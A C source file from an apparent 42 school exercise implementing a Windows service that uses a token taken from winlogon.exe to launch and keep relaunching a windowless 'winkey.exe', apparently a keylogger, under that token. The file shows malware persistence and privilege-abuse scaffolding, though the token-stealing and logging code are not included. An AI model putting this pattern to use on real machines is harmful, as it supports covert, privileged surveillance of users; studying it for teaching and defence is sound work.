/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   service_manager.c                                  :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: vzurera- <vzurera-@student.42malaga.com    +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2025/05/11 13:31:13 by vzurera-          #+#    #+#             */
/*   Updated: 2025/05/14 00:05:13 by vzurera-         ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#pragma region "Includes"

	#include "svc.h"

#pragma endregion

#pragma region "Variables"

	static SERVICE_STATUS          g_ServiceStatus;
	static SERVICE_STATUS_HANDLE   g_StatusHandle;
	static PROCESS_INFORMATION     g_ProcessInfo = {0};
	static BOOL                    g_ProcessRunning = FALSE;

	HANDLE                  g_ServiceStopEvent = NULL;

#pragma endregion

#pragma region "Methods"

	#pragma region "Close Process"

		void CloseProcess() {
			if (g_ProcessRunning && g_ProcessInfo.hProcess) {
				// Open the termination event that the client process is waiting for
				HANDLE hEvent = OpenEvent(EVENT_MODIFY_STATE, FALSE, "Global\\WinkeyTerminateEvent");
				if (hEvent) {
					// Signal the event so the client knows it should terminate
					SetEvent(hEvent);
					
					// Wait a reasonable time for the client to exit gracefully
					DWORD waitResult = WaitForSingleObject(g_ProcessInfo.hProcess, 2000);
					
					// Close the termination event handle
					CloseHandle(hEvent);
					
					// If the process did not exit after waiting, force termination
					if (waitResult == WAIT_TIMEOUT) TerminateProcess(g_ProcessInfo.hProcess, 0);
				} else TerminateProcess(g_ProcessInfo.hProcess, 0);
				
				CloseHandle(g_ProcessInfo.hProcess);
				CloseHandle(g_ProcessInfo.hThread);
				g_ProcessRunning = FALSE;
			}
		}

	#pragma endregion

	#pragma region "Main Loop"

		void MainLoop(HANDLE dup_token_handle) {
			BOOL keepRunning = TRUE;
			while (keepRunning) {
				// Check if service stop has been requested
				if (WaitForSingleObject(g_ServiceStopEvent, 0) == WAIT_OBJECT_0) { keepRunning = FALSE; break; }

				// If the process is already running, check its state
				if (g_ProcessRunning) {
					DWORD exitCode = 0;
					if (GetExitCodeProcess(g_ProcessInfo.hProcess, &exitCode)) {
						if (exitCode != STILL_ACTIVE) {
							CloseHandle(g_ProcessInfo.hProcess);
							CloseHandle(g_ProcessInfo.hThread);
							g_ProcessRunning = FALSE;
						} else { Sleep(1000); continue; }
					} else g_ProcessRunning = FALSE;
				}

				// If we get here, we need to start the process
				STARTUPINFO si;
				ZeroMemory(&si, sizeof(si));
				si.cb = sizeof(si);
				ZeroMemory(&g_ProcessInfo, sizeof(g_ProcessInfo));

				// Start the process using winlogon.exe's token
				if (CreateProcessAsUser(
					dup_token_handle,	// Token stolen from winlogon.exe
					Winkey_Path,		// Path to the executable
					NULL,				// No need for av[1] here
					NULL,				// Process security attributes
					NULL,				// Thread security attributes
					FALSE,				// Do not inherit handles
					CREATE_NO_WINDOW,	// Create without a window
					NULL,				// Use parent's environment
					NULL,				// Use current directory
					&si,				// Startup info
					&g_ProcessInfo		// Process info
				)) g_ProcessRunning = TRUE; else Sleep(5000);
			}
		}

	#pragma endregion

	#pragma region "Report Status"

		void ReportStatus(DWORD dwCurrentState, DWORD dwWin32ExitCode, DWORD dwWaitHint) {
			// Report the service status to the Service Control Manager (SCM)
			g_ServiceStatus.dwCurrentState = dwCurrentState;
			g_ServiceStatus.dwWin32ExitCode = dwWin32ExitCode;
			g_ServiceStatus.dwWaitHint = dwWaitHint;

			SetServiceStatus(g_StatusHandle, &g_ServiceStatus);
		}

	#pragma endregion

	#pragma region "Service Control"

		// Handler for service control events (when SCM sends a command)
		VOID WINAPI ServiceCtrl(DWORD dwCtrl) {
			if (dwCtrl == SERVICE_CONTROL_STOP) {
				ReportStatus(SERVICE_STOP_PENDING, NO_ERROR, 3000);

				// Signal the event to stop the main loop
				if (g_ServiceStopEvent)  SetEvent(g_ServiceStopEvent);

				// Terminate the process if it's running
				CloseProcess();
			}
		}

	#pragma endregion

	#pragma region "Service Main"

		void WINAPI ServiceMain(DWORD dwArgc, LPSTR *lpszArgv) { (void) dwArgc; (void) lpszArgv;
			// Register the service control handler
			g_StatusHandle = RegisterServiceCtrlHandler(Name, ServiceCtrl);
			if (g_StatusHandle == NULL) return;

			// Initialize the service status
			g_ServiceStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
			g_ServiceStatus.dwCurrentState = SERVICE_START_PENDING;
			g_ServiceStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP;
			g_ServiceStatus.dwWin32ExitCode = 0;
			g_ServiceStatus.dwServiceSpecificExitCode = 0;
			g_ServiceStatus.dwWaitHint = 0;

			// Create an event to signal service stop
			g_ServiceStopEvent = CreateEvent(NULL, TRUE, FALSE, NULL);
			if (g_ServiceStopEvent == NULL) { ReportStatus(SERVICE_STOPPED, GetLastError(), 0); return; }

			ReportStatus(SERVICE_RUNNING, NO_ERROR, 0);

			// Impersonate winlogon.exe token
			HANDLE dup_token_handle = impersonate();
			if (!dup_token_handle) return;

			// Manage winkey.exe
			MainLoop(dup_token_handle);

			CloseProcess();
			CloseHandle(g_ServiceStopEvent);
			ReportStatus(SERVICE_STOPPED, NO_ERROR, 0);
		}

	#pragma endregion

#pragma endregion
